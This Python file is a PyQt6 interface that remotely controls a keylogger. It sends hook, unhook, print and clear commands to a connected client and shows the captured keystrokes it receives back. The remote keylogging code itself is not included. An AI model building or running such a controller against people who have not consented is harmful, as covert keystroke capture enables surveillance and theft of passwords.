from keylogDesigner import KeylogDesigner
import globalVar as gv
import utils
from PyQt6.QtWidgets import QApplication
import sys


class KeylogApp(KeylogDesigner):
    def __init__(self):
        super().__init__()

    def onButtonHookClick(self):
        utils.send(gv.client, "keylogHook()")

    def onButtonUnhookClick(self):
        utils.send(gv.client, "keylogUnhook()")

    def onButtonPrintKeyClick(self):
        utils.send(gv.client, "keylogPrint()")

        self.txtOutput.setText(utils.readStr(gv.client))

    def onButtonClearClick(self):
        utils.send(gv.client, "keylogClear()")

        self.txtOutput.setText("")

    def closeEvent(self, event):
        self.onButtonUnhookClick()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    keylogApp = KeylogApp()
    keylogApp.show()
    sys.exit(app.exec())
